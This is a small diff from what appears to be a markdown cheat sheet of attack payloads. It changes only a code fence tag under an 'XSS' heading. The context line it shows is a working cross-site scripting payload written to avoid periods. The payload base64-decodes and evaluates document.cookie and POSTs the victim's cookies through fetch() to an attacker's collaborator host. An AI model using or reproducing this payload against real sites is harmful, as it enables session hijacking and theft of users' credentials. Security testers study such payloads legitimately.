@@ -12,7 +12,7 @@
 
 # XSS
 
-```js
+```javascript
 // No periods (.)
 "-fetch(atob('<base64-of-your-colaborator>'), {method: 'POST', mode: 'no-cors', body:eval(atob('ZG9jdW1lbnQuY29va2ll'))})-"
 
